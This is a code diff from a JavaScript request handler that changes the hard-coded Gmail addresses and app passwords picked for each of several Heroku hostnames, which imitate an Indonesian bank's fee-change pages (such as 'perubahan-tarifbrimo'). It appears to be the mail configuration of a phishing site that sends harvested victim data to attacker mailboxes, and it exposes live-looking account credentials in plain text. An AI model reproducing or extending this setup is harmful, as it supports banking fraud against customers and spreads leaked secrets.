@@ -23,16 +23,16 @@ export default function handler(req, res) {
     {
 
         email = 'suksesk541@gmail.com'; //email
-        pass = 'stpqngfmsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'stjbb ngfmsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if(url == 'perubahan-tarifbrimo.herokuapp.com') //jika url sama dengan url hosting
     {
         email = 'besarhasil47@gmail.com'; //email
-        pass = 'srpjnijggqmomn'; //sandi aplikasi dari verifikasi 2 langkah
+        pass = 'srpjnijggjbhmmomn'; //sandi aplikasi dari verifikasi 2 langkah
         
     } else if (url == 'formpilihan-tarif.herokuapp.com'){
         email= 'barulink236@gmail.com';
-        pass = 'bopgkupeiukmb';
+        pass = 'bopgkupeiknkmb';
     }
     else {
 
